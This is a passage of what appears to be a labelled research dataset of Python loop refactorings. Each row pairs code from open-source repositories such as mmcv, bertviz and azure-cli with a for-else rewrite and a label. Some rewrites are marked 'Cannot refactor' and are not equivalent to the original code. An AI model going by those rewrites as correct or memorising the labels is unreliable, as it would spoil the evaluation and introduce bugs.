                    ""%d:%s"" % (x, y) for (x, y) in six.iteritems(token_is_max_context)
                ]))

                logging.info(""input_ids: %s"" % "" "".join([str(x) for x in input_ids]))
                logging.info(
                    ""input_mask: %s"" % "" "".join([str(x) for x in input_mask]))
                logging.info(
                    ""segment_ids: %s"" % "" "".join([str(x) for x in segment_ids]))
                logging.info(
                    ""question_mask: %s"" % "" "".join([str(x) for x in question_mask]))
                logging.info('start_position: %d : end_position: %d' % (start_position, end_position))
                if is_training and instance['answer_type'] != 'unknown':
                    logging.info(""answer_type: %d %d %d %d"" % (unk_mask, yes_mask, no_mask, extractive_mask))
                    if extractive_mask == 1:
                        answer_text = "" "".join(tokens[start_position:(end_position + 1)])
                        logging.info(""start_position: %d"" % (start_position))
                        logging.info(""end_position: %d"" % (end_position))
                        logging.info(
                          ""answer: %s"" % (tokenization.printable_text(answer_text)))
                    if yes_mask == 1 or no_mask == 1 or extractive_mask == 1:
                        rationale_text = "" "".join(tokens[doc_rationale_start:(doc_rationale_end + 1)])
                        logging.info(""rationale_start_position: %d"" % (doc_rationale_start))
                        logging.info(""rationale_end_position: %d"" % (doc_rationale_end))
                        logging.info(
                          ""rationale: %s"" % (tokenization.printable_text(rationale_text)))
                        logging.info(
                            ""rationale_mask: %s"" % "" "".join([str(x) for x in rationale_mask]))

            new_instance = {
                'doc_span_index': doc_span_index,
                'tokens': tokens,
                'token_to_orig_map': token_to_orig_map,
                'token_is_max_context': token_is_max_context,
                'input_ids': input_ids,
                'input_mask': input_mask,
                'segment_ids': segment_ids,
                'start_position': start_position,
                'end_position': end_position,
                'unk_mask' : unk_mask,
                'yes_mask' : yes_mask,
                'no_mask' : no_mask,
                'extractive_mask' : extractive_mask,
                'question_mask' : question_mask,
                'rationale_mask' : rationale_mask
            }

            for k, v in instance.items():
                if k not in new_instance:
                    new_instance[k] = v
            new_instances.append(new_instance)
        return new_instances","for (doc_span_index, doc_span) in enumerate(doc_spans):
    doc_start = doc_span.start
    doc_end = doc_span.start + doc_span.length - 1
    if tok_start_position >= doc_start and tok_end_position <= doc_end:
        full_answer_in_one_chunk = True
        break
if not full_answer_in_one_chunk:
    return None","for (doc_span_index, doc_span) in enumerate(doc_spans):
    doc_start = doc_span.start
    doc_end = doc_span.start + doc_span.length - 1
    if tok_start_position >= doc_start and tok_end_position <= doc_end:
        break
else:
    return None","for (doc_span_index, doc_span) in enumerate(doc_spans):
    doc_start = doc_span.start
    doc_end = doc_span.start + doc_span.length - 1
    if tok_start_position >= doc_start and tok_end_position <= doc_end:
        break
else:
    return None",1,"for (doc_span_index, doc_span) in enumerate(doc_spans):
    doc_start = doc_span.start
    doc_end = doc_span.start + doc_span.length - 1
    if tok_start_position >= doc_start and tok_end_position <= doc_end:
        full_answer_in_one_chunk = True
        break
if not full_answer_in_one_chunk:
    return None","break statement is executed:None
break statement is not executed:zejun1"
mmcv,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/mmcv/mmcv/runner/optimizer/default_constructor.py,https://github.com/open-mmlab/mmcv/tree/master/mmcv/runner/optimizer/default_constructor.py,DefaultOptimizerConstructor,add_params$137,"def add_params(self, params, module, prefix='', is_dcn_module=None):
        """"""Add all parameters of module to the params list.

        The parameters of the given module will be added to the list of param
        groups, with specific rules defined by paramwise_cfg.

        Args:
            params (list[dict]): A list of param groups, it will be modified
                in place.
            module (nn.Module): The module to be added.
            prefix (str): The prefix of the module
            is_dcn_module (int|float|None): If the current module is a
                submodule of DCN, `is_dcn_module` will be passed to
                control conv_offset layer's learning rate. Defaults to None.
        """"""
        # get param-wise options
        custom_keys = self.paramwise_cfg.get('custom_keys', {})
        # first sort with alphabet order and then sort with reversed len of str
        sorted_keys = sorted(sorted(custom_keys.keys()), key=len, reverse=True)

        bias_lr_mult = self.paramwise_cfg.get('bias_lr_mult', 1.)
        bias_decay_mult = self.paramwise_cfg.get('bias_decay_mult', 1.)
        norm_decay_mult = self.paramwise_cfg.get('norm_decay_mult', 1.)
        dwconv_decay_mult = self.paramwise_cfg.get('dwconv_decay_mult', 1.)
        bypass_duplicate = self.paramwise_cfg.get('bypass_duplicate', False)
        dcn_offset_lr_mult = self.paramwise_cfg.get('dcn_offset_lr_mult', 1.)

        # special rules for norm layers and depth-wise conv layers
        is_norm = isinstance(module,
                             (_BatchNorm, _InstanceNorm, GroupNorm, LayerNorm))
        is_dwconv = (
            isinstance(module, torch.nn.Conv2d)
            and module.in_channels == module.groups)

        for name, param in module.named_parameters(recurse=False):
            param_group = {'params': [param]}
            if not param.requires_grad:
                params.append(param_group)
                continue
            if bypass_duplicate and self._is_in(param_group, params):
                warnings.warn(f'{prefix} is duplicate. It is skipped since '
                              f'bypass_duplicate={bypass_duplicate}')
                continue
            # if the parameter match one of the custom keys, ignore other rules
            is_custom = False
            for key in sorted_keys:
                if key in f'{prefix}.{name}':
                    is_custom = True
                    lr_mult = custom_keys[key].get('lr_mult', 1.)
                    param_group['lr'] = self.base_lr * lr_mult
                    if self.base_wd is not None:
                        decay_mult = custom_keys[key].get('decay_mult', 1.)
                        param_group['weight_decay'] = self.base_wd * decay_mult
                    break

            if not is_custom:
                # bias_lr_mult affects all bias parameters
                # except for norm.bias dcn.conv_offset.bias
                if name == 'bias' and not (is_norm or is_dcn_module):
                    param_group['lr'] = self.base_lr * bias_lr_mult

                if (prefix.find('conv_offset') != -1 and is_dcn_module
                        and isinstance(module, torch.nn.Conv2d)):
                    # deal with both dcn_offset's bias & weight
                    param_group['lr'] = self.base_lr * dcn_offset_lr_mult

                # apply weight decay policies
                if self.base_wd is not None:
                    # norm decay
                    if is_norm:
                        param_group[
                            'weight_decay'] = self.base_wd * norm_decay_mult
                    # depth-wise conv
                    elif is_dwconv:
                        param_group[
                            'weight_decay'] = self.base_wd * dwconv_decay_mult
                    # bias lr and decay
                    elif name == 'bias' and not is_dcn_module:
                        # TODO: current bias_decay_mult will have affect on DCN
                        param_group[
                            'weight_decay'] = self.base_wd * bias_decay_mult
            params.append(param_group)

        if check_ops_exist():
            from mmcv.ops import DeformConv2d, ModulatedDeformConv2d
            is_dcn_module = isinstance(module,
                                       (DeformConv2d, ModulatedDeformConv2d))
        else:
            is_dcn_module = False
        for child_name, child_mod in module.named_children():
            child_prefix = f'{prefix}.{child_name}' if prefix else child_name
            self.add_params(
                params,
                child_mod,
                prefix=child_prefix,
                is_dcn_module=is_dcn_module)","for key in sorted_keys:
    if key in f'{prefix}.{name}':
        is_custom = True
        lr_mult = custom_keys[key].get('lr_mult', 1.0)
        param_group['lr'] = self.base_lr * lr_mult
        if self.base_wd is not None:
            decay_mult = custom_keys[key].get('decay_mult', 1.0)
            param_group['weight_decay'] = self.base_wd * decay_mult
        break
if not is_custom:
    if name == 'bias' and (not (is_norm or is_dcn_module)):
        param_group['lr'] = self.base_lr * bias_lr_mult
    if prefix.find('conv_offset') != -1 and is_dcn_module and isinstance(module, torch.nn.Conv2d):
        param_group['lr'] = self.base_lr * dcn_offset_lr_mult
    if self.base_wd is not None:
        if is_norm:
            param_group['weight_decay'] = self.base_wd * norm_decay_mult
        elif is_dwconv:
            param_group['weight_decay'] = self.base_wd * dwconv_decay_mult
        elif name == 'bias' and (not is_dcn_module):
            param_group['weight_decay'] = self.base_wd * bias_decay_mult","for key in sorted_keys:
    if key in f'{prefix}.{name}':
        lr_mult = custom_keys[key].get('lr_mult', 1.0)
        param_group['lr'] = self.base_lr * lr_mult
        if self.base_wd is not None:
            decay_mult = custom_keys[key].get('decay_mult', 1.0)
            param_group['weight_decay'] = self.base_wd * decay_mult
        break
else:
    if name == 'bias' and (not (is_norm or is_dcn_module)):
        param_group['lr'] = self.base_lr * bias_lr_mult
    if prefix.find('conv_offset') != -1 and is_dcn_module and isinstance(module, torch.nn.Conv2d):
        param_group['lr'] = self.base_lr * dcn_offset_lr_mult
    if self.base_wd is not None:
        if is_norm:
            param_group['weight_decay'] = self.base_wd * norm_decay_mult
        elif is_dwconv:
            param_group['weight_decay'] = self.base_wd * dwconv_decay_mult
        elif name == 'bias' and (not is_dcn_module):
            param_group['weight_decay'] = self.base_wd * bias_decay_mult","for key in sorted_keys:
    if key in f'{prefix}.{name}':
        lr_mult = custom_keys[key].get('lr_mult', 1.0)
        param_group['lr'] = self.base_lr * lr_mult
        if self.base_wd is not None:
            decay_mult = custom_keys[key].get('decay_mult', 1.0)
            param_group['weight_decay'] = self.base_wd * decay_mult
        break
else:
    if name == 'bias' and (not (is_norm or is_dcn_module)):
        param_group['lr'] = self.base_lr * bias_lr_mult
    if prefix.find('conv_offset') != -1 and is_dcn_module and isinstance(module, torch.nn.Conv2d):
        param_group['lr'] = self.base_lr * dcn_offset_lr_mult
    if self.base_wd is not None:
        if is_norm:
            param_group['weight_decay'] = self.base_wd * norm_decay_mult
        elif is_dwconv:
            param_group['weight_decay'] = self.base_wd * dwconv_decay_mult
        elif name == 'bias' and (not is_dcn_module):
            param_group['weight_decay'] = self.base_wd * bias_decay_mult",1,"for key in sorted_keys:
    if key in f'{prefix}.{name}':
        is_custom = True
        lr_mult = custom_keys[key].get('lr_mult', 1.0)
        param_group['lr'] = self.base_lr * lr_mult
        if self.base_wd is not None:
            decay_mult = custom_keys[key].get('decay_mult', 1.0)
            param_group['weight_decay'] = self.base_wd * decay_mult
        break
if not is_custom:
    if name == 'bias' and (not (is_norm or is_dcn_module)):
        param_group['lr'] = self.base_lr * bias_lr_mult
    if prefix.find('conv_offset') != -1 and is_dcn_module and isinstance(module, torch.nn.Conv2d):
        param_group['lr'] = self.base_lr * dcn_offset_lr_mult
    if self.base_wd is not None:
        if is_norm:
            param_group['weight_decay'] = self.base_wd * norm_decay_mult
        elif is_dwconv:
            param_group['weight_decay'] = self.base_wd * dwconv_decay_mult
        elif name == 'bias' and (not is_dcn_module):
            param_group['weight_decay'] = self.base_wd * bias_decay_mult","break statement is executed:None
break statement is not executed:zejun1"
AttackSurfaceMapper,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/AttackSurfaceMapper/modules/subbrute.py,https://github.com/superhedgy/AttackSurfaceMapper/tree/master/modules/subbrute.py,Lookup,run$428,"def run(self):
        # This process needs one resolver before it can start looking.
        self.resolver.add_ns(self.get_ns_blocking())
        work = True
        while work:
            response = None
            work = self.get_work()
            # if the code above found work
            if work:
                # Keep track of what we are working on
                self.current_work = work
                self.start_time = datetime.datetime.now()
                # keep track of how many times this lookup has timedout.
                (hostname, query_type, timeout_retries) = work
                response = self.check(hostname, query_type, timeout_retries)
                sys.stdout.flush()
                # This variable doesn't need a muetex, because it has a queue.
                # A queue ensure nameserver cannot be used before it's wildcard entries are found.
                reject = False
                found = []
                if response:
                    trace(response)
                    for record in response:
                        return_name, record_type, data = record
                        data = str(data)
                        if len(data) and len(record_type) and not len(return_name):
                            # The server we are dealing with is a monster.
                            return_name = hostname
                        if data in self.resolver.wildcards:
                            trace(""resovled wildcard:"", hostname)
                            reject = True
                            # reject this domain.
                            break
                        else:
                            found.append(record)
                    if not reject:
                        for f in found:
                            # This request is filled, send the results back
                            self.out_q.put(f)","for record in response:
    (return_name, record_type, data) = record
    data = str(data)
    if len(data) and len(record_type) and (not len(return_name)):
        return_name = hostname
    if data in self.resolver.wildcards:
        trace('resovled wildcard:', hostname)
        reject = True
        break
    else:
        found.append(record)
if not reject:
    for f in found:
        self.out_q.put(f)","for record in response:
    (return_name, record_type, data) = record
    data = str(data)
    if len(data) and len(record_type) and (not len(return_name)):
        return_name = hostname
    if data in self.resolver.wildcards:
        trace('resovled wildcard:', hostname)
        break
    else:
        found.append(record)
else:
    for f in found:
        self.out_q.put(f)","for record in response:
    (return_name, record_type, data) = record
    data = str(data)
    if len(data) and len(record_type) and (not len(return_name)):
        return_name = hostname
    if data in self.resolver.wildcards:
        trace('resovled wildcard:', hostname)
        break
    else:
        found.append(record)
else:
    for f in found:
        self.out_q.put(f)",1,"for record in response:
    (return_name, record_type, data) = record
    data = str(data)
    if len(data) and len(record_type) and (not len(return_name)):
        return_name = hostname
    if data in self.resolver.wildcards:
        trace('resovled wildcard:', hostname)
        reject = True
        break
    else:
        found.append(record)
if not reject:
    for f in found:
        self.out_q.put(f)","break statement is executed:None
break statement is not executed:zejun1"
sickbeard_mp4_automator,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/sickbeard_mp4_automator/resources/metadata.py,https://github.com/mdhiggins/sickbeard_mp4_automator/tree/master/resources/metadata.py,Metadata,getArtwork$370,"def getArtwork(self, path, inputfile, thumbnail=False):
        # Check for artwork in the same directory as the source
        poster = None
        base, _ = os.path.splitext(inputfile)
        base2, _ = os.path.splitext(path)
        for b in [base, base2]:
            for e in valid_poster_extensions:
                path = b + os.extsep + e
                if (os.path.exists(path)):
                    poster = path
                    self.log.info(""Local artwork detected, using %s."" % path)
                    break
            if poster:
                break

        if not poster:
            d, f = os.path.split(path)
            for e in valid_poster_extensions:
                path = os.path.join(d, ""smaposter"" + os.extsep + e)
                if (os.path.exists(path)):
                    poster = path
                    self.log.info(""Local artwork detected, using %s."" % path)
                    break

        # If no local files are found, attempt to download them
        if not poster:
            poster_path = None
            if self.mediatype == MediaType.Movie:
                poster_path = self.moviedata.get('poster_path')
            elif self.mediatype == MediaType.TV:
                if thumbnail:
                    poster_path = self.episodedata.get('still_path')
                else:
                    poster_path = self.seasondata.get('poster_path')

                if not poster_path:
                    poster_path = self.showdata.get('poster_path')

            if not poster_path:
                self.log.debug(""No artwork found for media file."")
                return None

            savepath = os.path.join(tempfile.gettempdir(), ""poster-%s.jpg"" % (self.tmdbid))

            # Ensure the save path is clear
            if os.path.exists(savepath):
                try:
                    os.remove(savepath)
                except KeyboardInterrupt:
                    raise
                except:
                    i = 2
                    while os.path.exists(savepath):
                        savepath = os.path.join(tempfile.gettempdir(), ""poster-%s.%d.jpg"" % (self.tmdbid, i))
                        i += 1

            try:
                poster = self.urlretrieve(""https://image.tmdb.org/t/p/original"" + poster_path, savepath)[0]
            except Exception:
                self.log.exception(""Exception while retrieving poster"" % poster_path)
        return poster","for b in [base, base2]:
    for e in valid_poster_extensions:
        path = b + os.extsep + e
        if os.path.exists(path):
            poster = path
            self.log.info('Local artwork detected, using %s.' % path)
            break
    if poster:
        break
if not poster:
    (d, f) = os.path.split(path)
    for e in valid_poster_extensions:
        path = os.path.join(d, 'smaposter' + os.extsep + e)
        if os.path.exists(path):
            poster = path
            self.log.info('Local artwork detected, using %s.' % path)
            break","for b in [base, base2]:
    for e in valid_poster_extensions:
        path = b + os.extsep + e
        if os.path.exists(path):
            poster = path
            self.log.info('Local artwork detected, using %s.' % path)
            break
    if poster:
        break
else:
    (d, f) = os.path.split(path)
    for e in valid_poster_extensions:
        path = os.path.join(d, 'smaposter' + os.extsep + e)
        if os.path.exists(path):
            poster = path
            self.log.info('Local artwork detected, using %s.' % path)
            break","for b in [base, base2]:
    for e in valid_poster_extensions:
        path = b + os.extsep + e
        if os.path.exists(path):
            poster = path
            self.log.info('Local artwork detected, using %s.' % path)
            break
    if poster:
        break
else:
    (d, f) = os.path.split(path)
    for e in valid_poster_extensions:
        path = os.path.join(d, 'smaposter' + os.extsep + e)
        if os.path.exists(path):
            poster = path
            self.log.info('Local artwork detected, using %s.' % path)
            break",1,"for b in [base, base2]:
    for e in valid_poster_extensions:
        path = b + os.extsep + e
        if os.path.exists(path):
            poster = path
            self.log.info('Local artwork detected, using %s.' % path)
            break
    if poster:
        break
if not poster:
    (d, f) = os.path.split(path)
    for e in valid_poster_extensions:
        path = os.path.join(d, 'smaposter' + os.extsep + e)
        if os.path.exists(path):
            poster = path
            self.log.info('Local artwork detected, using %s.' % path)
            break","break statement is executed:None
break statement is not executed:zejun1"
sickbeard_mp4_automator,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/sickbeard_mp4_automator/resources/metadata.py,https://github.com/mdhiggins/sickbeard_mp4_automator/tree/master/resources/metadata.py,Metadata,getArtwork$370,"def getArtwork(self, path, inputfile, thumbnail=False):
        # Check for artwork in the same directory as the source
        poster = None
        base, _ = os.path.splitext(inputfile)
        base2, _ = os.path.splitext(path)
        for b in [base, base2]:
            for e in valid_poster_extensions:
                path = b + os.extsep + e
                if (os.path.exists(path)):
                    poster = path
                    self.log.info(""Local artwork detected, using %s."" % path)
                    break
            if poster:
                break

        if not poster:
            d, f = os.path.split(path)
            for e in valid_poster_extensions:
                path = os.path.join(d, ""smaposter"" + os.extsep + e)
                if (os.path.exists(path)):
                    poster = path
                    self.log.info(""Local artwork detected, using %s."" % path)
                    break

        # If no local files are found, attempt to download them
        if not poster:
            poster_path = None
            if self.mediatype == MediaType.Movie:
                poster_path = self.moviedata.get('poster_path')
            elif self.mediatype == MediaType.TV:
                if thumbnail:
                    poster_path = self.episodedata.get('still_path')
                else:
                    poster_path = self.seasondata.get('poster_path')

                if not poster_path:
                    poster_path = self.showdata.get('poster_path')

            if not poster_path:
                self.log.debug(""No artwork found for media file."")
                return None

            savepath = os.path.join(tempfile.gettempdir(), ""poster-%s.jpg"" % (self.tmdbid))

            # Ensure the save path is clear
            if os.path.exists(savepath):
                try:
                    os.remove(savepath)
                except KeyboardInterrupt:
                    raise
                except:
                    i = 2
                    while os.path.exists(savepath):
                        savepath = os.path.join(tempfile.gettempdir(), ""poster-%s.%d.jpg"" % (self.tmdbid, i))
                        i += 1

            try:
                poster = self.urlretrieve(""https://image.tmdb.org/t/p/original"" + poster_path, savepath)[0]
            except Exception:
                self.log.exception(""Exception while retrieving poster"" % poster_path)
        return poster","for e in valid_poster_extensions:
    path = b + os.extsep + e
    if os.path.exists(path):
        poster = path
        self.log.info('Local artwork detected, using %s.' % path)
        break
if poster:
    break","for e in valid_poster_extensions:
    path = b + os.extsep + e
    if os.path.exists(path):
        poster = path
        self.log.info('Local artwork detected, using %s.' % path)
        break
else:
    break",Cannot refactor,-1,"for e in valid_poster_extensions:
    path = b + os.extsep + e
    if os.path.exists(path):
        poster = path
        self.log.info('Local artwork detected, using %s.' % path)
        break
if poster:
    break","break statement is executed:None
break statement is not executed:zejun1"
shuup,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/shuup/_misc/ensure_code_style.py,https://github.com/shuup/shuup/tree/master/_misc/ensure_code_style.py,VerboseNameVisitor,visit_Call$35,"def visit_Call(self, node, parents, context=None):  # noqa (N802)
        name = dotify_ast_name(node.func)
        if name == ""InternalIdentifierField"":
            return
        if name == ""TranslatedFields"":
            for kw in node.keywords:
                if isinstance(kw.value, ast.Call):
                    self.visit_Call(kw.value, parents, context=kw.arg)
            return
        if not any(name.endswith(suffix) for suffix in (""ForeignKey"", ""Field"")):
            return

        if not context:
            if isinstance(parents[-1], ast.Assign):
                context = get_assign_first_target(parents[-1])

        if context and (context.startswith(""_"") or context.endswith(""data"")):
            return

        kwmap = dict((kw.arg, kw.value) for kw in node.keywords)

        kw_value = None
        needle = None
        for needle in (""verbose_name"", ""label""):
            kw_value = kwmap.get(needle)
            if kw_value:
                break
        if not kw_value:
            if node.kwargs:  # Assume dynamic use (has **kwargs)
                return
            self.errors.append(
                ""Error! %d: %s call missing verbose_name or label (ctx: %s)."" % (node.lineno, name, context)
            )
            return

        if isinstance(kw_value, ast.BinOp) and isinstance(kw_value.op, ast.Mod):
            # It's an interpolation operation; use the lvalue (probably the call)
            kw_value = kw_value.left

        if isinstance(kw_value, ast.Call) and dotify_ast_name(kw_value.func) == ""_"":
            arg = kw_value.args[0]
            if isinstance(arg, ast.Str) and needle == ""verbose_name"":
                if not arg.s[0].islower() and not any(arg.s.startswith(acronym) for acronym in KNOWN_ACRONYMS):
                    self.errors.append(
                        ""Error! %d: %s `%s` not lower-case (value: %r) (ctx: %s).""
                        % (node.lineno, name, needle, arg.s, context)
                    )
            return

        if isinstance(kw_value, ast.Name):  # It's a variable
            return

        self.errors.append(
            ""Error! %d: %s `%s` present but not translatable (ctx: %s)."" % (node.lineno, name, needle, context)
        )","for needle in ('verbose_name', 'label'):
    kw_value = kwmap.get(needle)
    if kw_value:
        break
if not kw_value:
    if node.kwargs:
        return
    self.errors.append('Error! %d: %s call missing verbose_name or label (ctx: %s).' % (node.lineno, name, context))
    return","for needle in ('verbose_name', 'label'):
    kw_value = kwmap.get(needle)
    if kw_value:
        break
else:
    if node.kwargs:
        return
    self.errors.append('Error! %d: %s call missing verbose_name or label (ctx: %s).' % (node.lineno, name, context))
    return","for needle in ('verbose_name', 'label'):
    kw_value = kwmap.get(needle)
    if kw_value:
        break
else:
    if node.kwargs:
        return
    self.errors.append('Error! %d: %s call missing verbose_name or label (ctx: %s).' % (node.lineno, name, context))
    return",1,"for needle in ('verbose_name', 'label'):
    kw_value = kwmap.get(needle)
    if kw_value:
        break
if not kw_value:
    if node.kwargs:
        return
    self.errors.append('Error! %d: %s call missing verbose_name or label (ctx: %s).' % (node.lineno, name, context))
    return","break statement is executed:None
break statement is not executed:zejun1"
bertviz,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/bertviz/bertviz/transformers_neuron_view/tokenization_bert.py,https://github.com/jessevig/bertviz/tree/master/bertviz/transformers_neuron_view/tokenization_bert.py,WordpieceTokenizer,tokenize$363,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
          input = ""unaffable""
          output = [""un"", ""##aff"", ""##able""]

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer`.

        Returns:
          A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
bertviz,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/bertviz/bertviz/transformers_neuron_view/tokenization_bert.py,https://github.com/jessevig/bertviz/tree/master/bertviz/transformers_neuron_view/tokenization_bert.py,WordpieceTokenizer,tokenize$363,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
          input = ""unaffable""
          output = [""un"", ""##aff"", ""##able""]

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer`.

        Returns:
          A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
azure-cli,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/azure-cli/src/azure-cli/azure/cli/command_modules/acs/custom.py,https://github.com/Azure/azure-cli/tree/master/src/azure-cli/azure/cli/command_modules/acs/custom.py,,aks_agentpool_delete$2147,"def aks_agentpool_delete(cmd, client, resource_group_name, cluster_name,
                         nodepool_name,
                         no_wait=False):
    agentpool_exists = False
    instances = client.list(resource_group_name, cluster_name)
    for agentpool_profile in instances:
        if agentpool_profile.name.lower() == nodepool_name.lower():
            agentpool_exists = True
            break

    if not agentpool_exists:
        raise CLIError(""Node pool {} doesnt exist, ""
                       ""use 'aks nodepool list' to get current node pool list"".format(nodepool_name))

    return sdk_no_wait(no_wait, client.begin_delete, resource_group_name, cluster_name, nodepool_name)","for agentpool_profile in instances:
    if agentpool_profile.name.lower() == nodepool_name.lower():
        agentpool_exists = True
        break
if not agentpool_exists:
    raise CLIError(""Node pool {} doesnt exist, use 'aks nodepool list' to get current node pool list"".format(nodepool_name))","for agentpool_profile in instances:
    if agentpool_profile.name.lower() == nodepool_name.lower():
        break
else:
    raise CLIError(""Node pool {} doesnt exist, use 'aks nodepool list' to get current node pool list"".format(nodepool_name))","for agentpool_profile in instances:
    if agentpool_profile.name.lower() == nodepool_name.lower():
        break
else:
    raise CLIError(""Node pool {} doesnt exist, use 'aks nodepool list' to get current node pool list"".format(nodepool_name))",1,"for agentpool_profile in instances:
    if agentpool_profile.name.lower() == nodepool_name.lower():
        agentpool_exists = True
        break
if not agentpool_exists:
    raise CLIError(""Node pool {} doesnt exist, use 'aks nodepool list' to get current node pool list"".format(nodepool_name))","break statement is executed:None
break statement is not executed:zejun1"
ProperTree,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/ProperTree/Scripts/plistwindow.py,https://github.com/corpnewt/ProperTree/tree/master/Scripts/plistwindow.py,PlistWindow,merge_menu_preset$2642,"def merge_menu_preset(self, val = None):
        if val == None:
            return
        # We need to walk the path of the item to ensure all
        # items exist - each should be a dict, unless specified
        # by a ""*"", which denotes a list.
        cell,path,itypes,value = val
        paths = self.split(str(path))
        types = itypes.split(""/"")
        if not len(paths) == len(types):
            self.bell()
            mb.showerror(""Incorrect Patch Format"", ""Patch is incomplete."", parent=self)
            return
        if not len(paths) or paths[0] == ""*"":
            # No path, or it's an array
            self.bell()
            mb.showerror(""Incorrect Patch Format"", ""Patch starts with an array - must be a dictionary."", parent=self)
            return
        # Iterate both the paths and types lists - checking for each value,
        # and ensuring the type
        created = None
        current_cell = """"
        undo_list = []
        for p,t in izip(paths,types):
            found = False
            needed_type = {""d"":""Dictionary"",""a"":""Array""}.get(t.lower(),""Dictionary"")
            for x in self._tree.get_children(current_cell):
                cell_name = self._tree.item(x,""text"")
                if cell_name == p:
                    current_type = self.get_check_type(x)
                    if not current_type.lower() == needed_type.lower():
                        # Raise an error - type mismatch
                        self.bell()
                        if mb.askyesno(""Incorrect Type"",""{} is {}, should be {}.\n\nWould you like to replace it?"".format(cell_name,current_type,needed_type),parent=self):
                            # We need to remove any children, and change the type
                            for y in self._tree.get_children(x):
                                undo_list.append({
                                    ""type"":""remove"",
                                    ""cell"":y,
                                    ""from"":x,
                                    ""index"":self._tree.index(y)
                                })
                                self._tree.detach(y)
                            # Change the type
                            undo_list.append({
                                ""type"":""edit"",
                                ""cell"":x,
                                ""text"":self._tree.item(x,""text""),
                                ""values"":self._tree.item(x,""values"")
                            })
                            values = self.get_padded_values(x,3)
                            values[0] = self.menu_code + "" "" + needed_type
                            if needed_type.lower() == ""dictionary"":
                                values[1] = ""0 key/value pairs""
                            else:
                                values[1] = ""0 children""
                            self._tree.item(x, values=values)
                        else:
                            # Let's undo anything we've already done and bail
                            self.reundo(None,True,undo_list)
                            return
                    found = True
                    current_cell = x
                    break
            if not found:
                # Need to add it
                current_cell = self._tree.insert(current_cell,""end"",text=p,values=(self.menu_code+"" ""+needed_type,"""",self.drag_code,),open=True)
                undo_list.append({
                    ""type"":""add"",
                    ""cell"":current_cell
                })
        # At this point - we should be able to add the final piece
        # let's first make sure it doesn't already exist - if it does, we
        # will overwrite it
        current_type = self.get_check_type(current_cell).lower()
        just_add = True
        replace_asked = False
        if current_type == ""dictionary"":
